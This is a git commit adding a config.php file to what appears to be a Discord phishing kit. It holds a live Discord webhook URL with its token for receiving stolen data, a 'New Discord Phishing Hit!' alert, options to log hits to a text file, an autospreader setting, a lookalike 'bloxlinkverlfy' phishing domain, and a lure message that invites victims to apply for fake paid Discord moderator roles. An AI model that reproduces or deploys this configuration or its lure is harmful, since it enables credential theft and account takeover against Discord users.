02289981214468d31f9e9ce45bc7e24a82d4459f
lostlog <124115839+l0stlog@users.noreply.github.com>
2023-02-15 02:58:01 -0800

    Create config.php

---
+++ config.php
@@ -0,0 +1,13 @@
+<?php
+// MAIN CONFIG
+$WEBHOOK = "https://discord.com/api/webhooks/1066905032991182909/gDzfg-Ncw1cVtN2Hv6vBYnfvxszpCBUkf8c2kJAHIDmpihgSvvv4WFqFj7GWHgVDFxPo";
+$webhookpfp = "https://cdn.discordapp.com/attachments/1059666771457605635/1059714386249392209/delsiyapfp.png";
+$embedmsg = "@everyone **New Discord Phishing Hit!**";
+$SAVE_TO_TXT = TRUE;
+$SEND_TO_WEBHOOK = TRUE;
+
+// AUTOSPREADER & PARSER
+$AUTOSPREAD = FALSE;
+$API_URL = "https://your-api-site-link.com/api/spread/";
+$WEBSITE_LINK = "http://bloxlinkverlfy.000webhostapp.com/";
+$MESSAGE = "Hello, i don't know if you hear about that but Discord turned on applications of Moderators Team, you can earn monthly money from discord for moderating official servers and a cool badge in profile. If you want to apply, you can apply there: $WEBSITE_LINK";
